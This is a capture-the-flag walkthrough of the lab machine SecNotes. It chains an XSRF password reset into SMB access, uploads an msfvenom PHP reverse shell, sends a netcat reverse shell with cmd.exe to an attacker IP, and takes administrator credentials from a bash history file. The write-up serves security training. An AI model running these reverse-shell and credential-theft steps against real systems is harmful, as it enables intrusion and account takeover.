### Enumeration 80/tcp

![[secnotes-01.png]]

we will get a login page in the web page.

Try `admin:password` and `admin:admin` but failed.

we try some simple sql injection attack but doesn't work.

We try use gobuster to find more information by gobuster:

Fast Scan with gobuster:

```bash
gobuster dir -e -u http://10.10.10.97 -w /usr/share/wordlists/dirb/big.txt -t 20
```

Scan with feroxbuster:

```bash
feroxbuster -u http://10.10.10.97
```

but nothing found.

And we look register function, we creage new user account and login.

After login, we will see a Notes panel for this page.

![[secnotes-02.png]]

For the first line of website, we saw a note: 

` Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII) Please contact tyler@secnotes.htb using the contact link below with any questions. `

The admin’s name is tyler, and that the site is expecting interaction. If I check at the login page, tyler is a valid account on this site.

![[secnotes-03.png]]

The four buttons allow actions. Creating a note will put a note in my page. This process is has no filtering, and the user can submit all sorts of nefarious stuff into a note. However, since there’s no way to share a note with another user, most XSS attacks would only work against you the attacker.

Signing out will simply destroy my session and redirect back to login page. The other two buttons are interesting.

#### Change Password

The “Change Password” button takes us to `/change_pass.php`, which has a form:

![[secnotes-04.png]]

I note that it doens't need our original password. I open a burpsuite and I will see the POST to `/change_pass.php` has following data `password=newpassword&confirm_password=newpassword&submit=submit`

```http
POST /change_pass.php HTTP/1.1
Host: 10.10.10.97
Content-Length: 63
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.97
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

Cookie: PHPSESSID=7dpset9j1va4nric5neprrt0rd
Connection: close

password=newpassword&confirm_password=newpassword&submit=submit
```

If I try that request as a GET by visiting:

```
http://10.10.10.97/change_pass.php?password=newpassword&confirm_password=newpassword&submit=submit
```

it works! 

![[secnotes-06.png]]

That’ll prove useful in a bit. We will use it functions in later attacks.

![[secnotes-05.png]]

#### Contact Us

The “Contact Us” button takes me to a contact page:

![[secnotes-07.png]]

On sending a message, I’m redirected back to home, with a note saying “Message Sent”.

I’ll also find that if I include a link in the message, it is clicked. 

```bash
# build up a http server
python3 -m http.server 80
```

For example, if I include `http://10.10.14.8/test.php` in the message, I’ll get the following a few seconds later:

![[secnotes-08.png]]

So, Guess What? We could combine reset password function and contact us functions to do XSRF attack.

### Exploits: Get Tyler’s Credentials

A Cross-Site Request Forgery (XSRF) is also known as “one-click attack” and “session riding”. The idea is that an attacker can craft a url such that when a target visits it, some actions or commands are taken that the user may not have wanted to take. For a site that’s vulnerable to XSRF, this can be a nasty attack, since the attacker can control the text of the link they send the target, making it not too hard to trick people into clicking on links.

#### XSRF in Action

XSRF is easily defeated by including POST parameters such as a token in the form that generates the request which would not be replicated in the link passed to the target.

The combination of the `/change_pass.php` accepting GET and not requiring the current password, and my ability to get someone to click on links in the `/contact.php` page provides an opportunity for a Cross-Site Request Forgery (XSRF) attack.

I’ll include url to change the password in the message, and then another for our local host, when I see a callback, I can try to log in as tyler.

So, send the following message:

```
http://10.10.10.97/change_pass.php?password=newpassword&confirm_password=newpassword&submit=submit
http://10.10.14.8/missioncompleted
```

![[secnotes-09.png]]

![[secnotes-10.png]]

And then check if password the tyler has been reset to `newpassword`

![[secnotes-11.png]]

Excellent! We are in!

Let's check the contents of this page.

![[secnotes-12.png]]

when we check `new site` we will found some likely password file. Since we know smb was enabled in this machine,  The interesting note is the 3rd, “new site”, which seems to have SMB credentials. Since this is Windows and SSH isn’t running we can try to see if it has SMB share access privileges.

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

### Exploit:  SMB access as tyler

Using the creds from the site, I’ll use `smbmap` to see what I now have access to:

```bash
smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'
```

![[secnotes-13.png]]

Apparently we could access smb folder.

We are able to see something new here, specifically **new-site**. Enumerating the new-site share we see:

```bash
smbmap -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97 -R new-site
```

![[secnotes-14.png]]

I’ll connect to the SMB share as tyler, and find the basics of a default IIS site (must be 8808 port):

```bash
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
```

Let's try to upload something.

```bash
# kali
echo test > test.txt
```

Put file to smb:

```bash
# smb
put test.txt
```

![[secnotes-15.png]]

Access the file:

```bash
curl http://10.10.10.97:8808/test.txt
```

```
┌──(kali㉿kali)-[~/Desktop/Hackthebox/SecNotes]
└─$ curl http://10.10.10.97:8808/test.txt
test

```

Excellent! we could use it to upload reverse shell.

### Exploit: PHP reverse shell

Let’s first get a PHP reverse shell with msfvenom

```bash
msfvenom -a php --platform php -p php/reverse_php LHOST=10.10.14.8 LPORT=1234 -f raw -o shell.php
```

Build up a listener for 1234:

```bash
nc -lvnp 1234
```

Upload webshell by smb:

```bash
# smb
put shell.php
exit
```

![[secnotes-16.png]]
And we will access the shell:

```bash
curl http://10.10.10.97:8808/shell.php
```

![[secnotes-17.png]]

Cool. We could get a web shell. 

### Exploit : Upgrade from web shell to Interactive Shell

*Method 1: nc.exe*

Find a nc.exe on our kali

```bash
# kali
locate nc.exe
```

Upload nc.exe to new-site folder:

```bash
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /usr/share/windows-resources/binaries/nc.exe nc.exe'
```

```
┌──(kali㉿kali)-[~/Desktop/Hackthebox/SecNotes]
└─$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site -c 'put /usr/share/windows-resources/binaries/nc.exe nc.exe'
putting file /usr/share/windows-resources/binaries/nc.exe as \nc.exe (37.7 kb/s) (average 37.7 kb/s)

```

Build up a new listner 443:

```bash
nc -lnvp 443
```

Next, invoke web shell again (optional):

```bash
curl http://10.10.10.97:8808/shell.php
```

In web shell command run nc.exe to connect 443 port of lhost:

```bash
nc.exe -e cmd.exe 10.10.14.8 443
```

```
┌──(kali㉿kali)-[~/Desktop/Hackthebox/SecNotes]

nc.exe -e cmd.exe 10.10.14.8 443

```

![[secnotes-18.png]]

Excellent! we get interactive shell. we will check and capture the user flag.

### Privilege Escalation

#### winpeas check

First we upload winpeas binary by smb:

```bash
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site
```

```
┌──(kali㉿kali)-[~/Desktop/Hackthebox/SecNotes]

Try "help" to get a list of possible commands.
smb: \> put winPEASany.exe
putting file winPEASany.exe as \winPEASany.exe (33.4 kb/s) (average 33.4 kb/s)

```

```bash
put winPEASany.exe
```

Run winPEAS on the victim:

```cmd
cd C:\inetpub\new-site
winPEASany.exe
```

In the output of WinPEAS we will find:

```

```

There are some interesting stuff , but `bash.lnk` that’s weird because we are on a windows machine.

I can search for `bash.exe`, and find it:

```cmd
where /R c:\ bash.exe
```

```
C:\inetpub\new-site>where /R c:\ bash.exe
where /R c:\ bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

```

Now it’s just a matter of running it, and using `python` to get a interactive pty, just like on a Linux host:

```cmd
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```
```bash
id
python -c 'import pty;pty.spawn("/bin/bash")'
ls -al
```

![[secnotes-20.png]]

We will get a stable shell with python pty , We see that we are root on this subsystem. And we check contents and find bash history file.

```bash
cat .bash_history
```

```
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history

```

![[secnotes-21.png]]
we will see history command shows password of administrator. 

It looks like the admin was trying to mount the local file system himself, and there’s the administrator password. It even seems that the user tried to clear the bash history, but because the current session is written in on exit, it only cleared history prior to this session.

#### Shell as administrator

With admin creds, we can now use `winexe` (or `psexec.py`) to get a shell on the box:

```bash
winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
```

```cmd
whoami
ipconfig
type C:\Users\Administrator\Desktop\root.txt
